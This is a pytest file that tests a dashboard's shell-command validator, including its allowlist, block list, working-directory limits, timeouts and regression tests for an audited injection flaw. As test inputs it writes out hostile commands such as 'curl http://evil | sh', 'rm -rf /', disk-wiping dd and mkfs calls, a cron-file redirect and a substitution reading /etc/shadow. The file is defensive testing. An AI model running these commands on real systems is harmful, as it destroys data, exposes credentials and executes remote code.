"""Dashboard shell command injection hardening tests."""

import subprocess
from pathlib import Path
from unittest.mock import MagicMock

import pytest

from seam_runtime.dashboard import (
    ALLOWED_SHELL_COMMANDS,
    BLOCKED_SHELL_COMMANDS,
    _get_shell_timeout,
    _validate_shell_command,
    _validate_shell_cwd,
)


class TestValidateShellCommand:
    """_validate_shell_command returns the validated argv to run shell-free."""

    def test_allowed_ls(self):
        assert _validate_shell_command("ls -la") == ["ls", "-la"]

    def test_allowed_cat(self):
        assert _validate_shell_command("cat /etc/hosts") == ["cat", "/etc/hosts"]

    def test_allowed_grep(self):
        assert _validate_shell_command("grep -r pattern .") == ["grep", "-r", "pattern", "."]

    def test_allowed_find(self):
        assert _validate_shell_command("find . -name '*.py'") == ["find", ".", "-name", "*.py"]

    def test_allowed_pwd(self):
        assert _validate_shell_command("pwd") == ["pwd"]

    def test_allowed_date(self):
        assert _validate_shell_command("date") == ["date"]

    def test_allowed_whoami(self):
        assert _validate_shell_command("whoami") == ["whoami"]

    def test_allowed_echo(self):
        assert _validate_shell_command("echo hello") == ["echo", "hello"]

    def test_allowed_head(self):
        assert _validate_shell_command("head -n 10 file.txt") == ["head", "-n", "10", "file.txt"]

    def test_allowed_tail(self):
        assert _validate_shell_command("tail -n 10 file.txt") == ["tail", "-n", "10", "file.txt"]

    def test_allowed_wc(self):
        assert _validate_shell_command("wc -l file.txt") == ["wc", "-l", "file.txt"]

    def test_allowed_sort(self):
        assert _validate_shell_command("sort file.txt") == ["sort", "file.txt"]

    def test_allowed_uniq(self):
        assert _validate_shell_command("uniq file.txt") == ["uniq", "file.txt"]

    def test_allowed_cut(self):
        assert _validate_shell_command("cut -d: -f1 /etc/passwd") == ["cut", "-d:", "-f1", "/etc/passwd"]

    def test_allowed_awk(self):
        assert _validate_shell_command("awk '{print $1}' file.txt") == ["awk", "{print $1}", "file.txt"]

    def test_allowed_sed(self):
        assert _validate_shell_command("sed 's/foo/bar/g' file.txt") == ["sed", "s/foo/bar/g", "file.txt"]

    def test_blocked_rm(self):
        with pytest.raises(PermissionError, match="blocked set"):
            _validate_shell_command("rm -rf /")

    def test_blocked_sudo(self):
        with pytest.raises(PermissionError, match="blocked set"):
            _validate_shell_command("sudo ls")

    def test_blocked_su(self):
        with pytest.raises(PermissionError, match="blocked set"):
            _validate_shell_command("su -")

    def test_blocked_chmod(self):
        with pytest.raises(PermissionError, match="blocked set"):
            _validate_shell_command("chmod 777 file.txt")

    def test_blocked_chown(self):
        with pytest.raises(PermissionError, match="blocked set"):
            _validate_shell_command("chown root:root file.txt")

    def test_blocked_kill(self):
        with pytest.raises(PermissionError, match="blocked set"):
            _validate_shell_command("kill -9 1234")

    def test_blocked_pkill(self):
        with pytest.raises(PermissionError, match="blocked set"):
            _validate_shell_command("pkill python")

    def test_blocked_dd(self):
        with pytest.raises(PermissionError, match="blocked set"):
            _validate_shell_command("dd if=/dev/zero of=/dev/sda")

    def test_blocked_mkfs(self):
        with pytest.raises(PermissionError, match="blocked set"):
            _validate_shell_command("mkfs.ext4 /dev/sda1")

    def test_blocked_mount(self):
        with pytest.raises(PermissionError, match="blocked set"):
            _validate_shell_command("mount /dev/sda1 /mnt")

    def test_blocked_umount(self):
        with pytest.raises(PermissionError, match="blocked set"):
            _validate_shell_command("umount /mnt")

    def test_blocked_shutdown(self):
        with pytest.raises(PermissionError, match="blocked set"):
            _validate_shell_command("shutdown -h now")

    def test_blocked_reboot(self):
        with pytest.raises(PermissionError, match="blocked set"):
            _validate_shell_command("reboot")

    def test_blocked_init(self):
        with pytest.raises(PermissionError, match="blocked set"):
            _validate_shell_command("init 0")

    def test_unknown_command_rejected(self):
        with pytest.raises(PermissionError, match="not in the allowed set"):
            _validate_shell_command("curl https://example.com")

    def test_unknown_command_wget_rejected(self):
        with pytest.raises(PermissionError, match="not in the allowed set"):
            _validate_shell_command("wget https://example.com")

    def test_unknown_command_python_rejected(self):
        with pytest.raises(PermissionError, match="not in the allowed set"):
            _validate_shell_command("python3 script.py")

    def test_empty_command_rejected(self):
        with pytest.raises(PermissionError, match="Empty shell command"):
            _validate_shell_command("")

    def test_whitespace_only_rejected(self):
        with pytest.raises(PermissionError, match="Empty shell command"):
            _validate_shell_command("   ")

    def test_command_with_path_in_argv0_rejected(self):
        # A path in argv[0] is rejected outright. Validating only the basename
        # would let an absolute/relative path whose final component matches an
        # allowed name (e.g. /custom/path/git, ./ls) smuggle an arbitrary binary
        # past the allowlist. Require a bare command name resolved against PATH.
        for command in ("/bin/ls -la", "./ls", "../bin/ls", "sub/dir/ls"):
            with pytest.raises(PermissionError, match="bare command name"):
                _validate_shell_command(command)

    def test_path_in_later_arg_allowed(self):
        # Slashes are only forbidden in argv[0]; path arguments are fine.
        assert _validate_shell_command("ls /tmp") == ["ls", "/tmp"]

    def test_malformed_command_rejected(self):
        with pytest.raises(PermissionError, match="Cannot parse"):
            _validate_shell_command("echo 'unclosed quote")


class TestShellInjectionRejected:
    """Audit S1 PoC payloads: chaining/redirection/substitution can't escape.

    Security comes from shell-free execution (shell=False); the spaced-operator
    payloads also get a clean up-front rejection.
    """

    def test_command_chaining_rejected(self):
        with pytest.raises(PermissionError, match="operator"):
            _validate_shell_command("ls && curl http://evil | sh")

    def test_redirection_to_system_path_rejected(self):
        with pytest.raises(PermissionError, match="operator"):
            _validate_shell_command("echo hi > /etc/cron.d/x")

    def test_semicolon_chaining_rejected(self):
        with pytest.raises(PermissionError, match="operator"):
            _validate_shell_command("ls ; rm -rf /")

    def test_pipe_token_rejected(self):
        with pytest.raises(PermissionError, match="operator"):
            _validate_shell_command("cat /etc/passwd | grep root")

    def test_command_substitution_runs_as_literal_args(self):
        # No spaced operator token, so validation accepts it — but because it
        # runs shell-free, "$(cat /etc/shadow)" is passed verbatim as literal
        # argv and never substituted. Proven by the integration test below.
        assert _validate_shell_command("echo $(cat /etc/shadow)") == [
            "echo",
            "$(cat",
            "/etc/shadow)",
        ]


class TestValidateShellCwd:
    def test_tmp_allowed(self):
        result = _validate_shell_cwd(Path("/tmp"))
        assert result == Path("/tmp").resolve()

    def test_tmp_subdir_allowed(self):
        result = _validate_shell_cwd(Path("/tmp/test_dir"))
        assert str(result).startswith(str(Path("/tmp").resolve()))

    def test_project_root_allowed(self):
        project_root = Path(__file__).resolve().parent.parent.parent
        result = _validate_shell_cwd(Path("/tmp"), project_root=project_root)
        assert result == Path("/tmp").resolve()

    def test_project_root_subdir_allowed(self):
        project_root = Path(__file__).resolve().parent.parent.parent
        subdir = project_root / "seam_runtime"
        result = _validate_shell_cwd(subdir, project_root=project_root)
        assert result == subdir.resolve()

    def test_arbitrary_path_rejected(self):
        with pytest.raises(PermissionError, match="outside allowed roots"):
            _validate_shell_cwd(Path("/home/user"))

    def test_etc_rejected(self):
        with pytest.raises(PermissionError, match="outside allowed roots"):
            _validate_shell_cwd(Path("/etc"))

    def test_var_rejected(self):
        with pytest.raises(PermissionError, match="outside allowed roots"):
            _validate_shell_cwd(Path("/var"))


class TestGetShellTimeout:
    def test_default_timeout(self, monkeypatch):
        monkeypatch.delenv("SEAM_SHELL_TIMEOUT_SECONDS", raising=False)
        assert _get_shell_timeout() == 10.0

    def test_custom_timeout(self, monkeypatch):
        monkeypatch.setenv("SEAM_SHELL_TIMEOUT_SECONDS", "30")
        assert _get_shell_timeout() == 30.0

    def test_invalid_timeout_uses_default(self, monkeypatch):
        monkeypatch.setenv("SEAM_SHELL_TIMEOUT_SECONDS", "invalid")
        assert _get_shell_timeout() == 10.0

    def test_zero_timeout(self, monkeypatch):
        monkeypatch.setenv("SEAM_SHELL_TIMEOUT_SECONDS", "0")
        assert _get_shell_timeout() == 0.0


class TestShellIntegration:
    def test_allowed_command_executes(self, monkeypatch, tmp_path):
        monkeypatch.setenv("SEAM_DASHBOARD_ALLOW_SHELL", "1")
        monkeypatch.setenv("SHELL", "/bin/bash")
        monkeypatch.setenv("SEAM_SHELL_TIMEOUT_SECONDS", "5")

        mock_self = MagicMock()
        mock_self.shell_cwd = tmp_path

        from seam_runtime.dashboard import TextualDashboardApp

        if hasattr(TextualDashboardApp, "_run_shell_subprocess"):
            result = TextualDashboardApp._run_shell_subprocess(mock_self, "echo hello")
            assert result.returncode == 0
            assert "hello" in result.stdout

    def test_blocked_command_rejected(self, monkeypatch, tmp_path):
        monkeypatch.setenv("SEAM_DASHBOARD_ALLOW_SHELL", "1")
        monkeypatch.setenv("SHELL", "/bin/bash")

        mock_self = MagicMock()
        mock_self.shell_cwd = tmp_path

        from seam_runtime.dashboard import TextualDashboardApp

        if hasattr(TextualDashboardApp, "_run_shell_subprocess"):
            with pytest.raises(PermissionError, match="blocked set"):
                TextualDashboardApp._run_shell_subprocess(mock_self, "rm -rf /")

    def test_shell_disabled_by_default(self, monkeypatch, tmp_path):
        monkeypatch.delenv("SEAM_DASHBOARD_ALLOW_SHELL", raising=False)

        mock_self = MagicMock()
        mock_self.shell_cwd = tmp_path

        from seam_runtime.dashboard import TextualDashboardApp

        if hasattr(TextualDashboardApp, "_run_shell_subprocess"):
            with pytest.raises(PermissionError, match="disabled by default"):
                TextualDashboardApp._run_shell_subprocess(mock_self, "echo hello")

    def test_command_substitution_not_expanded(self, monkeypatch, tmp_path):
        # Audit S1 regression: shell-free execution means $(...) is a literal
        # argument, never a subshell. Output echoes the text; no file is read.
        monkeypatch.setenv("SEAM_DASHBOARD_ALLOW_SHELL", "1")
        monkeypatch.setenv("SHELL", "/bin/bash")
        monkeypatch.setenv("SEAM_SHELL_TIMEOUT_SECONDS", "5")

        secret = tmp_path / "secret.txt"
        secret.write_text("TOP_SECRET_VALUE", encoding="utf-8")

        mock_self = MagicMock()
        mock_self.shell_cwd = tmp_path

        from seam_runtime.dashboard import TextualDashboardApp

        if hasattr(TextualDashboardApp, "_run_shell_subprocess"):
            result = TextualDashboardApp._run_shell_subprocess(
                mock_self, f"echo $(cat {secret})"
            )
            assert result.returncode == 0
            assert "$(cat" in result.stdout
            assert "TOP_SECRET_VALUE" not in result.stdout

    def test_cwd_outside_allowed_path_rejected(self, monkeypatch):
        monkeypatch.setenv("SEAM_DASHBOARD_ALLOW_SHELL", "1")
        monkeypatch.setenv("SHELL", "/bin/bash")

        mock_self = MagicMock()
        mock_self.shell_cwd = Path("/etc")

        from seam_runtime.dashboard import TextualDashboardApp

        if hasattr(TextualDashboardApp, "_run_shell_subprocess"):
            with pytest.raises(PermissionError, match="outside allowed roots"):
                TextualDashboardApp._run_shell_subprocess(mock_self, "echo hello")

    def test_timeout_enforcement(self, monkeypatch, tmp_path):
        monkeypatch.setenv("SEAM_DASHBOARD_ALLOW_SHELL", "1")
        monkeypatch.setenv("SHELL", "/bin/bash")
        monkeypatch.setenv("SEAM_SHELL_TIMEOUT_SECONDS", "1")

        mock_self = MagicMock()
        mock_self.shell_cwd = tmp_path

        from seam_runtime.dashboard import TextualDashboardApp

        if hasattr(TextualDashboardApp, "_run_shell_subprocess"):
            with pytest.raises(subprocess.TimeoutExpired):
                TextualDashboardApp._run_shell_subprocess(mock_self, "sleep 10")


class TestConstants:
    def test_allowed_commands_is_frozenset(self):
        assert isinstance(ALLOWED_SHELL_COMMANDS, frozenset)

    def test_blocked_commands_is_frozenset(self):
        assert isinstance(BLOCKED_SHELL_COMMANDS, frozenset)

    def test_no_overlap_between_allowed_and_blocked(self):
        overlap = ALLOWED_SHELL_COMMANDS & BLOCKED_SHELL_COMMANDS
        assert not overlap, f"Commands in both sets: {overlap}"

    def test_all_required_commands_present(self):
        required = {"ls", "cat", "grep", "find", "pwd", "date", "whoami", "echo"}
        assert required.issubset(ALLOWED_SHELL_COMMANDS)

    def test_all_dangerous_commands_blocked(self):
        dangerous = {"rm", "sudo", "su", "chmod", "chown", "kill", "pkill"}
        assert dangerous.issubset(BLOCKED_SHELL_COMMANDS)
